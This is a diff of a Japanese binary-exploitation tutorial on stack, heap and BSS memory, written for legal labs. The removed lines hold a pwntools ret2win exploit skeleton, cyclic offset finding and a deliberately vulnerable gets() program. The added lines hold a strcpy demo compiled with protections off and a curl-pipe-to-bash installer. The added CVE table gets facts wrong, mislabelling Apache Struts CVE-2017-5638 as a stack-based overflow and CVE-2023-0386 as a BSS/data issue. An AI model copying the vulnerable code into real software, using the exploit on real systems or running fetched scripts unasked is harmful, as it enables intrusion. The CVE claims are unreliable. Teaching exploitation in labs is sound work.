+> ⚠️ **注意**: 以下の演習はすべて自分が所有・管理する環境、または HTB / TryHackMe のような **利用規約に明示された合法ラボ** のみで実施すること。許可のない第三者システムへの適用は **不正アクセス禁止法（第 3 条）** に違反する（日本法）。海外在住の読者は各国の法令およびサービス利用規約にも必ず従うこと。
 
-### ステップ 1: バイナリのメモリ保護状況を確認する
-
+### 演習 1: 自プロセスのメモリマップを読む
 
 ```bash
-# checksec: 対象バイナリの緩和機構を一覧表示
-pip install pwntools
-
-# コマンドが見つからない場合は以下のいずれかを試す
-checksec --file=./vuln      # pwntools インストール時の形式
-pwn checksec ./vuln         # pwn サブコマンド形式
+# 実行中プロセスのメモリ領域を確認
+cat /proc/$$/maps
 
 # 出力例:
-# Arch:     amd64-64-little
-# RELRO:    Partial RELRO
-# Stack:    No canary found    ← Canary なし → BOF 可能
-# NX:       NX disabled        ← 実行可能スタック → シェルコード注入可
-# PIE:      No PIE             ← アドレス固定 → 固定アドレスで攻撃可
+# 55a1b2c3d000-55a1b2c3e000 r--p ... /bin/bash  ← テキスト
+# 55a1b2c3e000-55a1b2c4a000 r-xp ... /bin/bash  ← テキスト(実行可)
+# 55a1b3f00000-55a1b3f21000 rw-p ... [heap]      ← ヒープ
+# 7ffd1234a000-7ffd1234b000 rw-p ... [stack]     ← スタック
 
-
-# ELF セクション（.text/.data/.bss）の確認 — スタックはここには現れない
-readelf -S ./vuln | grep -E "\.text|\.bss|\.data"
-
-# スタックは実行時の仮想メモリ領域 → /proc/<PID>/maps で [stack] を確認する
-# （対象プロセスを起動してから別ターミナルで確認）
-./vuln &                    # バックグラウンドで起動
-PID=$!
-cat /proc/$PID/maps | grep -E "stack|heap|libc"
+# Python でメモリマップを読む
+python3 -c "
+import os
+pid = os.getpid()
+with open(f'/proc/{pid}/maps') as f:
+    for line in f:
+        if any(seg in line for seg in ['heap', 'stack', 'r-xp']):
+            print(line.rstrip())
+"
 ```
 
-### ステップ 2: スタックオフセットを特定する（パターン生成）
-
+### 演習 2: GDB でスタックフレームを観察する
 
 ```bash
-# pwntools で cyclic パターンを生成してオフセットを特定
-# bytes 形式で stdout に書き出す（b'...' 表示を避ける）
-python3 -c 'from pwn import *; import sys; sys.stdout.buffer.write(cyclic(200))' > pattern.bin
-
-# GDB + pwndbg でクラッシュ時の RIP を確認
-gdb -q ./vuln
-(gdb) run < pattern.bin
-# → SIGSEGV 発生、RIP の値を記録（例: 0x6161616b61616169）
-
-# pwndbg の cyclic コマンドで直接オフセット取得
-# pwndbg> cyclic -l 0x6161616b   ← クラッシュ時の RIP 下位 4バイト
-
-# Python でオフセットを計算
-
-python3 << 'EOF'
-from pwn import *
-# 64bit: RIP に入った値（例）を p64 でパックして先頭4バイトで検索
-rip_value = 0x6161616b61616169  # GDB で確認した RIP の値
-offset = cyclic_find(p64(rip_value)[:4])
-print(f"オフセット: {offset}")  # 例: 72
-EOF
-```
-
-```bash
-# GDB + pwndbg でスタックを直接観察
-gdb -q ./vuln
-(gdb) run < pattern.bin
-(gdb) info frame          # スタックフレームの詳細
-(gdb) x/20gx $rsp         # RSP から 20 ワード分を 16 進表示
-(gdb) info registers      # 全レジスタ値を表示
-```
-
-### ステップ 3: スタック BOF エクスプロイトの骨格（pwntools）
-
-
-```python
-# exploit.py — ret2win の基本スケルトン（ラボ環境のみ）
-from pwn import *
-
-# ターゲット設定
-elf = ELF('./vuln')        # バイナリ解析
-context.binary = elf
-context.log_level = 'info'
-
-# win() のアドレスを取得（PIE 無効の場合、アドレスは固定）
-# nm ./vuln | grep win  でも確認できる
-win_addr = elf.symbols['win']
-log.info(f"win() アドレス: {hex(win_addr)}")
-
-# オフセット確定（ステップ2で特定済み）
-offset = 72
-
-# ペイロード構築
-# buf(64) + saved RBP(8) = 72 バイトでパディング、次の 8 バイトが RIP
-payload  = b'A' * offset    # バッファ + saved RBP を埋める
-payload += p64(win_addr)    # p64() がリトルエンディアンに変換して RIP を上書き
-
-# stdin 型の vuln に送信
-io = process('./vuln')      # ローカル実行
-# io = remote('target.lab', 4444)  # リモート接続
-io.sendline(payload)
-io.interactive()  # シェルが起動したら対話モードへ
-```
-
-### ステップ 4: ヒープ構造を観察する（use-after-free 理解）
-
-
-```bash
-# Valgrind と ASan で UAF を検出する
-cat > uaf_demo.c << 'EOF'
+# gdb で簡単なプログラムのスタックを見る（Kali Linux）
+cat > /tmp/stack_demo.c << 'EOF'
 #include <stdio.h>
-#include <stdlib.h>
 #include <string.h>
 
+void inner(char *input) {
+    char buf[32];
+    strcpy(buf, input);  // ← 脆弱な関数（演習用）
+    printf("buf: %s\n", buf);
+}
+
+void outer() {
+    inner("Hello");
+}
+
 int main() {
-    char *ptr = malloc(64);
-    strcpy(ptr, "secret_password");
-    printf("確保後: %s\n", ptr);
-
-    free(ptr);  // 解放
-
-    // ❌ use-after-free: 解放済みポインタへのアクセス（未定義動作）
-    // 結果は環境依存: クラッシュ / 残留データ表示 / 別データ表示 のどれもありうる
-    printf("解放後（UAF）: %s\n", ptr);
-
-    // 同サイズで再確保すると前のチャンクが再利用される（tcache の動作）
-    char *ptr2 = malloc(64);
-    strcpy(ptr2, "ATTACKER_DATA");
-    printf("ptr（古い）経由: %s\n", ptr);  // → ATTACKER_DATA が見える場合がある
-
-    free(ptr2);
+    outer();
     return 0;
 }
 EOF
 
-# Valgrind で UAF を検出
-gcc -o uaf_demo uaf_demo.c -g
-valgrind --leak-check=full ./uaf_demo
+# コンパイル（保護機能を一時的に無効化した演習用バイナリ）
+gcc -g -fno-stack-protector -z execstack -o /tmp/stack_demo /tmp/stack_demo.c
 
-# AddressSanitizer で UAF を検出（より詳細なスタックトレース付き）
-gcc -o uaf_asan uaf_demo.c -fsanitize=address,undefined -g
-./uaf_asan
-# → heap-use-after-free エラーと発生箇所のスタックトレースを表示
+# GDB で解析
+gdb /tmp/stack_demo << 'GDBEOF'
+break inner
+run
+info frame
+x/32xw $rsp
+backtrace
+quit
+GDBEOF
 ```
 
-![pwndbg でのスタックフレーム観察](./images/3.png)
+### 演習 3: Python でヒープの動的確保を観察する
+
+```python
+#!/usr/bin/env python3
+"""ヒープ確保・解放のパターンを tracemalloc で観察する"""
+import tracemalloc
+import sys
+
+tracemalloc.start()
+
+# ヒープに大量確保
+chunks = []
+for i in range(10):
+    chunks.append(bytearray(1024 * 1024))  # 1MB ずつ確保
+
+snapshot1 = tracemalloc.take_snapshot()
+print(f"10MB 確保後: {sys.getsizeof(chunks) + sum(sys.getsizeof(c) for c in chunks)} bytes approx")
+
+# 解放
+del chunks[::2]  # 偶数インデックスを解放（断片化）
+
+snapshot2 = tracemalloc.take_snapshot()
+top_stats = snapshot2.compare_to(snapshot1, 'lineno')
+
+print("\n--- 変化上位 3 件 ---")
+for stat in top_stats[:3]:
+    print(stat)
+```
+
+### 演習 4: HTB / pwntools でスタックを操作する（発展）
+
+```bash
+# pwntools のインストール（Kali Linux）
+pip3 install pwntools --break-system-packages
+
+# 基本的なスタック操作の確認（ローカルバイナリ）
+python3 - << 'EOF'
+from pwn import *
+
+# ローカルバイナリの情報取得
+binary = ELF('/tmp/stack_demo')
+print(f"Architecture : {binary.arch}")
+print(f"Entry point  : {hex(binary.entry)}")
+print(f"NX enabled   : {binary.nx}")
+print(f"PIE enabled  : {binary.pie}")
+print(f"Stack canary : {binary.canary}")
+EOF
+```
 
 ---
 
 ## 防御策
 
-### スタックBOF への対策
+### 1. スタック保護機能（コンパイラ / OS レベル）
 
-#### Stack Canary（コンパイラレベル）
+| 機構 | 説明 | 有効化 |
+|------|------|--------|
+| **Stack Canary** | 戻りアドレスの手前に番兵値を置き、変化を検出 | `gcc -fstack-protector-strong` |
+| **ASLR** | メモリ領域のアドレスをランダム化 | `/proc/sys/kernel/randomize_va_space = 2` |
+| **NX / DEP** | スタック・ヒープを実行不可に設定 | `gcc -z noexecstack`（デフォルト有効） |
+| **PIE** | 実行ファイル本体もランダムアドレスに配置 | `gcc -fPIE -pie` |
 
 ```bash
-# ✅ Stack Canary を有効にしてコンパイル（GCC デフォルト）
-gcc -o safe safe.c -fstack-protector-strong
+# 現在の ASLR 設定確認
+cat /proc/sys/kernel/randomize_va_space
+# 0: 無効, 1: 部分的, 2: 完全（推奨）
 
-# Canary の仕組み:
-# 関数プロローグ: スタックに乱数（Canary 値）を書き込む
-# 関数エピローグ: 関数終了前に Canary が変化していないか確認
-# → 変化していれば __stack_chk_fail() でプロセスを即終了
+# バイナリの保護機能を確認
+checksec --file=/tmp/stack_demo
 ```
 
-#### 安全な文字列関数への置き換え（C）
+### 2. 言語レベルの安全策
 
+```python
+# ✅ Python: 再帰深度を必ず制限する
+import sys
+sys.setrecursionlimit(500)  # デフォルト 1000 より保守的に
 
-```c
-// ✅ 安全なコード — 境界チェックあり関数を使う
-#include <stdio.h>
-#include <string.h>
-
-void safe_function(const char *input) {
-    char buf[64];
-
-    // ✅ 推奨: snprintf を主に使う（NULL 終端を自動で保証）
-    snprintf(buf, sizeof(buf), "%s", input);
-
-    // ⚠️ strncpy は NUL 終端を保証しない場合があるため注意が必要
-    // 使う場合は必ず手動で終端を付ける
-    // strncpy(buf, input, sizeof(buf) - 1);
-    // buf[sizeof(buf) - 1] = '\0';
-
-    printf("入力: %s\n", buf);
-}
+# ✅ 外部入力のサイズを必ず検証する
+def safe_process(data: bytes, max_size: int = 4096) -> bytes:
+    if len(data) > max_size:
+        raise ValueError(f"入力が上限 {max_size} bytes を超えています")
+    return data
 ```
-
-#### PHP unserialize() の根本対策
-
-
-```php
-<?php
-// ✅ 根本対策: 安全なデータ交換には JSON を使う（OWASP 推奨）
-$jsonData = json_decode(base64_decode($_COOKIE['session'] ?? ''), true);
-
-// ✅ どうしても unserialize が必要な場合（最終手段）:
-// allowed_classes で許可クラスを制限する（PHP 7.0+）
-// ※ PHP マニュアルも「信頼できない入力を unserialize() に渡すな」と警告している
-$serialized = $_COOKIE['serialized_data'] ?? '';  // 変数名を分離
-$obj = unserialize($serialized, ['allowed_classes' => ['Config']]);
-
-// ✅ さらに安全: HMAC で署名検証してから unserialize
-// → 改ざんされたペイロードを処理する前に検証できる
-function safe_unserialize(string $raw, string $secret): mixed {
-    [$hmac, $payload] = explode(':', $raw, 2) + ['', ''];
-    if (!hash_equals(hash_hmac('sha256', $payload, $secret), $hmac)) {
-        throw new RuntimeException('署名検証失敗');
-    }
-    return unserialize(base64_decode($payload), ['allowed_classes' => false]);
-}
-?>
-```
-
-#### Node.js Buffer の安全な使い方
 
 ```javascript
-// ✅ 安全なコード — Buffer.alloc でゼロ初期化
-const http = require('http');
-
-const MAX_SIZE = 4096;  // 上限を明示
-
-http.createServer((req, res) => {
-    const url   = new URL(req.url, 'http://localhost');
-    const raw   = parseInt(url.searchParams.get('size') || '64');
-
-    // ✅ NaN / 負数 / 上限超過 / 非安全整数を一括で排除
-    if (!Number.isFinite(raw) || !Number.isSafeInteger(raw) || raw <= 0 || raw > MAX_SIZE) {
-        res.writeHead(400);
-        res.end('不正なサイズ');
-        return;
+// ✅ Node.js: Buffer のサイズを必ず検証する
+function safeRead(buffer, offset, length) {
+    if (offset < 0 || length < 0 || offset + length > buffer.length) {
+        throw new RangeError(`境界外アクセス: offset=${offset}, length=${length}`);
     }
+    return buffer.slice(offset, offset + length);
+}
 
-    // ✅ Buffer.alloc: ゼロ初期化（前の処理の残留データが入らない）
-    const buf = Buffer.alloc(raw);
-
-    res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
-    res.end(buf);
-}).listen(3000);
+// ✅ Node.js: 必ず Buffer.alloc() を使う（allocUnsafe は使わない）
+const safe = Buffer.alloc(64);        // ゼロ初期化保証
+// const unsafe = Buffer.allocUnsafe(64);  // ← 未初期化、使わない
 ```
 
-#### use-after-free への対策
+### 3. ヒープ安全策
 
-
-```c
-// ✅ free() 後すぐポインタを NULL 化（同一ポインタの二重アクセスを防ぐ）
-// ※ エイリアスされた別ポインタが残る場合には防げないため、所有権設計も必要
-free(ptr);
-ptr = NULL;  // 以降の ptr 経由アクセスは NULL 参照でクラッシュ → 即検出
-
-// ✅ 開発時は AddressSanitizer + UndefinedBehaviorSanitizer で自動検出
-// gcc -fsanitize=address,undefined -g
-
-// ✅ 2026年のベストプラクティス:
-// - C++: スマートポインタ（unique_ptr, shared_ptr）で所有権を明示
-// - 新規実装では Rust / Go 等のメモリ安全言語を検討する
-// - fuzzing（AFL++ + ASan）で UAF を自動発見する
-```
-
-#### Sanitizers / Fuzzing による自動発見
-
-
-```bash
-# ✅ AddressSanitizer + UndefinedBehaviorSanitizer でビルド（開発・テスト時）
-gcc -fsanitize=address,undefined -fno-omit-frame-pointer -g -O1 -o app_asan app.c
-./app_asan  # バッファオーバーフロー・UAF・型違反を即座に検出
-
-# ✅ AFL++ で自動ファジング（脆弱なコードを自動発見）
-# sudo apt install afl++
-afl-gcc -o vuln_fuzz vuln.c   # AFL instrumentation 付きコンパイル
-mkdir -p in out
-echo "AAAA" > in/seed
-afl-fuzz -i in -o out -- ./vuln_fuzz @@
-# → クラッシュを自動記録し、入力パターンを探索する
-```
-
-### OS・コンパイラレベルの多層防御
-
-```bash
-# ✅ ASLR を有効にする（Linux デフォルトは有効）
-echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
-# 0 = 無効, 1 = 部分的, 2 = 完全ランダム化
-
-# ✅ NX（実行不可スタック）: デフォルト有効
-# 無効化しないこと（-z execstack は研究目的のみ）
-
-
-# ✅ 完全な保護を有効にしたコンパイル例（コピペ実行可能）
-# -fstack-protector-strong : Stack Canary
-# -O2 -D_FORTIFY_SOURCE=2  : 安全関数の境界チェック強化（O2 必須）
-# -pie -fPIE               : PIE（アドレスランダム化）
-# -Wl,-z,relro             : RELRO（GOT を読み取り専用化）
-# -Wl,-z,now               : Full RELRO（GOT を起動時に即時解決してその後読み取り専用に）
-gcc -o hardened app.c \
-    -fstack-protector-strong \
-    -O2 -D_FORTIFY_SOURCE=2 \
-    -pie -fPIE \
-    -Wl,-z,relro \
-    -Wl,-z,now
-
-# checksec で確認
-checksec --file=./hardened
-# → RELRO: Full RELRO / Stack: Canary / NX: NX enabled / PIE: enabled
-```
-
-### 防御策チェックリスト
-
-
-| 脅威 | 対策 | 確認コマンド |
-|---|---|---|
-| スタック BOF | `snprintf` 等 + Stack Canary | `checksec --file=./binary` |
-| シェルコード注入 | NX / DEP 有効 | `checksec` で NX enabled 確認 |
-| ROP / ret2libc | ASLR + PIE | `/proc/sys/kernel/randomize_va_space` = 2 |
-| GOT 書き換え | Full RELRO (`-Wl,-z,now`) | `checksec` で Full RELRO 確認 |
-| use-after-free | 所有権設計 + `free()` 後 NULL 化 + ASan | `gcc -fsanitize=address` |
-| 未初期化メモリ | `calloc()`/`Buffer.alloc()` 使用 | `valgrind --tool=memcheck` |
-| PHP Object Injection | JSON 移行（根本対策）/ HMAC 署名検証 | SAST ツールでレビュー |
+- **Use-After-Free 防止**: ポインタを `free` したら即座に `NULL` に設定（C/C++）
+- **Double-Free 防止**: 解放済みフラグを変数で管理する
+- **境界チェック付き関数を使う**: `strcpy` → `strncpy` / `strlcpy`、`sprintf` → `snprintf`
+- **メモリ安全言語を採用**: Rust（所有権システムで UAF を型レベルで防ぐ）
 
 ---
 
 ## 実演ラボ案内
 
-### Hack The Box Academy
+| プラットフォーム | 推奨コンテンツ | 難易度 |
+|---|---|---|
+| **HTB Academy** | [Introduction to Binary Exploitation](https://academy.hackthebox.com/module/details/31) | ⭐⭐ |
+| **TryHackMe** | [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep) | ⭐⭐ |
+| **TryHackMe** | [Intro to x86-64](https://tryhackme.com/room/introtox8664) | ⭐ |
+| **pwn.college** | [Memory Errors](https://pwn.college/system-security/memory-errors/) | ⭐⭐ |
+| **自宅 VM** | GDB + pwntools で stack_demo を解析 | ⭐ |
+| **LiveOverflow** | YouTube: "Binary Exploitation / Memory Corruption" プレイリスト | ⭐ |
 
-
-- **Module**: Stack-Based Buffer Overflows on Linux x86  
-  `https://academy.hackthebox.com/module/details/31`
-- **Skill Path**: Introduction to Binary Exploitation（Assembly → Linux x86 BOF の順で進む）  
-  `https://academy.hackthebox.com/path/preview/intro-to-binary-exploitation`
-- **Heap Exploitation 系モジュール**: HTB Academy で "heap" を検索して最新モジュールを確認
-
-### TryHackMe
-
-- **Room**: Buffer Overflow Prep（スタック BOF 入門）  
-  `https://tryhackme.com/room/bufferoverflowprep`
-- **Room**: Pwn101（CTF スタイルの Pwn 入門）  
-  `https://tryhackme.com/room/pwn101`
-
-
-### ROP Emporium（ret2win → ROP への段階的な演習）
-
-- `ret2win` → `split` → `callme` → `write4` の順でスタック BOF から ROP まで段階的に学べる
-- `https://ropemporium.com/`
-
-### pwn.college（無料・体系的な Pwn 学習）
-
-- Assembly → メモリ → BOF → Shellcoding → ROP の順で構成されており HTB との組み合わせに最適
-- `https://pwn.college/`
-
-### 自宅環境のセットアップ
+### 自宅 VM でのセットアップ（Kali Linux）
 
 ```bash
-# pwntools + GDB プラグインのインストール
-pip install pwntools
-sudo apt install gdb
+# 必要ツールをインストール
+sudo apt install -y gdb gcc python3 python3-pip binutils
+pip3 install pwntools --break-system-packages
 
-# pwndbg（peda より高機能、推奨）
-git clone https://github.com/pwndbg/pwndbg
-cd pwndbg && ./setup.sh
+# GDB の拡張（peda / pwndbg / gef のいずれか）
+# GEF が最もインストールが簡単
+bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
 
-# AddressSanitizer + UBSan でメモリエラーを可視化（デバッグ用）
-gcc -o asan_demo demo.c -fsanitize=address,undefined -g
-./asan_demo
-# → メモリエラー発生箇所をスタックトレース付きで表示
-
-# 脆弱なバイナリを自分で作って練習（stdin 型）
-cat > practice.c << 'EOF'
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
-void vuln() { char buf[32]; gets(buf); }
-int main() { vuln(); return 0; }
-EOF
-# ret2win 練習は -z execstack なしでよい
-gcc -o practice practice.c -fno-stack-protector -no-pie
-checksec --file=./practice
+# 演習バイナリの保護設定を確認
+checksec --file=/tmp/stack_demo
 ```
 
 ---
 
 ## よくある誤解
 
-### 誤解 1: 「スタックは上方向に伸びる」
+### 誤解 1: 「スタックとヒープは同じもの」
 
-x86/x86-64 では **スタックは高位アドレスから低位アドレスへ（下方向に）伸びる**。`push` 命令は RSP を減算してからデータを書き込む。一方、典型的な C 配列では `buf[0]` から高位側へ連続して書かれる。この「逆向き」の組み合わせが BOF でリターンアドレスを上書きできる理由だ。
+**実際**: 用途・成長方向・管理方法がまったく異なる。スタックは関数呼び出しの記録を **コンパイラが自動管理**し、高位→低位方向に成長する。ヒープはプログラマ（または GC）が **手動で管理**し、低位→高位方向に成長する。混同すると脆弱性の原因分析が根本的にずれる。
 
-```
-RSP (スタックポインタ)          ← push で RSP が減る（下方向）
- ↓                              ← バッファへの書き込みは上方向
-[buf[0]][buf[1]]...[buf[63]][saved RBP][Return Address]
-```
+### 誤解 2: 「バッファオーバーフローはスタックだけで起きる」
 
-### 誤解 2: 「ヒープとスタックは別のプロセスで管理される」
-
-どちらも **同一プロセスの仮想アドレス空間内**にある。違いは管理方法だ。スタックは CPU の命令（PUSH/POP）と RSP レジスタで自動管理される。ヒープはアロケータ（glibc ptmalloc2 等）がソフトウェアで管理する。
+**実際**: **ヒープオーバーフロー**も同様に危険だ。ヒープ上の管理構造（チャンクヘッダ）を破壊すると、`malloc` / `free` の動作を乗っ取り任意コード実行につながる。CVE の分類でも "heap-based buffer overflow" と "stack-based buffer overflow" は区別される。攻撃手法の詳細は後続の「ヒープ攻撃入門」で扱う。
 
 ### 誤解 3: 「ASLR があれば BOF は防げる」
 
-ASLR はアドレスをランダム化するが、**情報リーク脆弱性**（メモリ上のアドレスを読み取る脆弱性）が組み合わさると無力化できる。また 32bit プロセスではエントロピーが低く、ブルートフォースが現実的なケースもある。ASLR は重要な緩和機構だが、単独で完全な防御にはならない。
+**実際**: ASLR はアドレスをランダム化するが、**アドレスリーク** があれば無効化される。また 32bit プロセスでは探索空間が小さいためブルートフォースで突破できる場合もある。ASLR は多層防御の 1 つに過ぎず、Stack Canary・NX・PIE を組み合わせて初めて効果が高まる。
 
-### 誤解 4: 「Python/Node.js は C と違うのでメモリ管理は関係ない」
+### 誤解 4: 「Python / Node.js はメモリ安全なので関係ない」
 
-Python や Node.js もインタープリタ/ランタイム自体は C/C++ で書かれており、そのメモリ管理バグを突く攻撃は存在する。さらに PHP の `unserialize()` や Node.js の `Buffer.allocUnsafe()` のように、**言語レベルのAPIがメモリを直接操作する箇所**は攻撃面になりうる。高水準言語だからといってメモリを無視できるわけではない。
+**実際**: GC 付き言語でもメモリ関連の脆弱性は存在する。Node.js の `Buffer.allocUnsafe()` は初期化されていないヒープ領域を返し、情報漏洩につながった事例がある（`safe-buffer` パッケージが生まれた背景）。Python の `ctypes` を使えば生メモリを操作でき、C 拡張モジュール経由の脆弱性も報告されている。
+
+### 誤解 5: 「BSS はバイナリサイズに含まれる」
+
+**実際**: BSS セグメントはバイナリファイルには **実データが格納されない**。"この変数が n バイト必要" という情報だけが記録され、実行時にローダーが 0 で埋める。これがバイナリが小さく見える理由の 1 つだ。`size` コマンドで各セクションのサイズを確認できる。
+
+```bash
+size /bin/ls
+# text    data    bss     dec     hex
+# 133930  4824    4696    143450  2305a
+```
 
 ---
 
 ## 関連 CVE と被害事例
 
-
-### 関連 CWE
-
-| CWE | 名称 | 本記事との対応 |
-|---|---|---|
-| **CWE-120** | Buffer Copy without Checking Size of Input | `strcpy`/`gets` 等の無境界コピー |
-| **CWE-121** | Stack-based Buffer Overflow | スタック BOF の節 |
-| **CWE-122** | Heap-based Buffer Overflow | ヒープ BOF・sudo CVE |
-| **CWE-416** | Use After Free | UAF デモの節 |
-| **CWE-787** | Out-of-bounds Write | BOF 全般 |
-| **CWE-190** | Integer Overflow or Wraparound | CVE-2022-0185 |
-
-### CVE-2021-3156 — sudo ヒープバッファオーバーフロー（Baron Samedit）
-
-`sudo` の引数処理に存在したヒープバッファオーバーフロー（CWE-122）。通常ユーザーがローカルで `root` 権限を取得できる。CVSS: **7.8（High）**。2021 年発見当時、10 年以上放置されていた欠陥で、Ubuntu / Debian / Fedora の主要ディストリビューションが影響を受けた (Qualys, 2021)。
-
-```bash
-# 影響確認（修正済みバージョンかチェック）
-sudo --version
-# sudo 1.8.32 未満 / 1.9.0〜1.9.5p1 未満が脆弱
-```
-
-### CVE-2022-0185 — Linux カーネル整数オーバーフロー → コンテナブレイクアウト
-
-Linux カーネルの `fsconfig()` システムコールで整数オーバーフロー（CWE-190）が発生し、ヒープバッファへの境界外書き込み（CWE-787）が可能に。コンテナ環境からホスト kernel へのエスケープが実証された。CVSS: **8.4（High）**。Docker / Kubernetes 環境に影響 (NIST, 2022)。
-
-
-
-### 国内・国際の主要被害事例
-
-
-| 年 | 脆弱性タイプ（CWE） | 内容 |
-|---|---|---|
-| 2021 | CWE-122 ヒープ BOF | CVE-2021-3156：主要 Linux ディストリビューション全体でローカル特権昇格 |
-| 2022 | CWE-190 → CWE-787 | CVE-2022-0185：コンテナブレイクアウト、クラウド環境に広範な影響 |
-| 2023 | PHP Object Injection | PHP の安全でないデシリアライゼーションによる WebShell 設置事例は国内外で報告されている (OWASP, 2021) |
+| CVE | 脆弱性種別 | メモリ領域 | 概要 |
+|-----|-----------|-----------|------|
+| **CVE-2014-0160** (Heartbleed) | ヒープ境界外読み取り | ヒープ | OpenSSL の `memcpy` サイズ未検証。秘密鍵・セッショントークンが漏洩。世界中の HTTPS サーバーに影響 |
+| **CVE-2021-3156** (Sudo Baron Samedit) | ヒープオーバーフロー | ヒープ | Sudo の引数処理でオフバイワン。root 権限昇格。Linux ほぼ全ディストリに影響 |
+| **CVE-2023-0386** (Linux OverlayFS) | 権限ビット不正昇格 | BSS / データ | ファイル権限フラグの検証不足。非特権ユーザーが SUID ファイルを配置可能 |
+| **CVE-2017-5638** (Apache Struts) | スタック経由のRCE | スタック | Content-Type ヘッダーのパース処理でコード実行。Equifax 大規模漏洩の原因 |
+| **Node.js safe-buffer 問題** | 情報漏洩 | ヒープ | `new Buffer(n)` が未初期化ヒープを返すため、他プロセスのデータが混入する可能性 |
 
 ---
 
 ## 次に学ぶべき記事
 
-- **[スタックバッファオーバーフロー完全解説](../stack-bof-deep-dive)** — ROP・ret2libc まで掘り下げ
-- **[ヒープ Exploitation 入門](../heap-exploitation-intro)** — ptmalloc2 の構造・UAF・house of series
-- **[GDB / pwndbg 入門](../gdb-pwndbg-basics)** — デバッガ操作の基礎
-- **[2進数・16進数・ビット演算](../bitwise-basics)** — メモリアドレスを読むための基礎
-- **[整数オーバーフロー入門](../integer-overflow)** — ヒープ BOF への橋渡し
-- **[シェルコード入門](../shellcode-basics)** — NX 無効環境でのコード注入
+- **[バッファオーバーフロー入門: スタックの仕組み]** — 本記事のスタック知識を攻撃手法に応用
+- **[GDB 入門: バイナリデバッグの基礎]** — メモリをリアルタイムで観察するツールの使い方
+- **[ヒープ攻撃入門: Use-After-Free と Heap Spray]** — ヒープ管理構造の破壊手法（中級）
+- **[Return-Oriented Programming (ROP) 入門]** — NX/DEP を回避する現代的な攻撃手法
+- **[2進数・16進数・ビット演算]** — メモリダンプを読むための数値表現の基礎（前提記事）
 
 ---
 
 ## 参考文献
 
+1. **Intel 64 and IA-32 Architectures Software Developer's Manual Vol. 1 — Chapter 5: Data Types and Addressing Modes**  
+   https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html
 
-1. Qualys Research Team. (2021). *Baron Samedit: Heap-Based Buffer Overflow in Sudo (CVE-2021-3156)*. https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
-2. NIST NVD. (2022). *CVE-2022-0185*. https://nvd.nist.gov/vuln/detail/CVE-2022-0185
-3. MITRE. (2024). *CWE-121: Stack-based Buffer Overflow*. https://cwe.mitre.org/data/definitions/121.html
-4. MITRE. (2024). *CWE-416: Use After Free*. https://cwe.mitre.org/data/definitions/416.html
-5. Andersen, S., & Abella, V. (2004). *Changes to Functionality in Microsoft Windows XP Service Pack 2 — Data Execution Prevention*. https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp-sp2/cc700810(v=technet.10)
-6. Phrack Magazine. (1996). *Smashing The Stack For Fun And Profit* (Aleph One). http://phrack.org/issues/49/14.html
-7. pwntools Documentation. (2024). *Getting Started*. https://docs.pwntools.com/en/stable/intro.html
-8. CTF Wiki. (2024). *Stack Overflow*. https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/
-9. IPA. (2024). *安全なウェブサイトの作り方 — バッファオーバーフロー*. https://www.ipa.go.jp/security/vuln/websecurity.html
-10. OWASP. (2021). *Deserialization Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
-11. glibc ptmalloc2. (2024). *The GNU C Library — Memory Allocation*. https://www.gnu.org/software/libc/manual/html_node/Memory-Allocation.html
-12. ROP Emporium. (2024). *ret2win*. https://ropemporium.com/challenge/ret2win.html
-13. pwn.college. (2024). *Introduction to Binary Exploitation*. https://pwn.college/
+2. **Linux man-page: proc(5) — /proc/[pid]/maps**  
+   https://man7.org/linux/man-pages/man5/proc.5.html
+
+3. **CVE-2014-0160 (Heartbleed) 詳細**  
+   https://heartbleed.com/
+
+4. **CVE-2021-3156 (Baron Samedit) Qualys 解析レポート**  
+   https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-buffer-overflow-sudo.txt
+
+5. **HTB Academy: Introduction to Binary Exploitation**  
+   https://academy.hackthebox.com/module/details/31
+
+6. **pwn.college: Memory Errors**  
+   https://pwn.college/system-security/memory-errors/
+
+7. **OWASP: Buffer Overflow**  
+   https://owasp.org/www-community/vulnerabilities/Buffer_Overflow
+
+8. **Node.js safe-buffer パッケージ（Buffer 初期化問題への対応）**  
+   https://github.com/feross/safe-buffer
+
+9. **不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）第 3 条**  
+   https://elaws.e-gov.go.jp/document?lawid=411AC0000000128
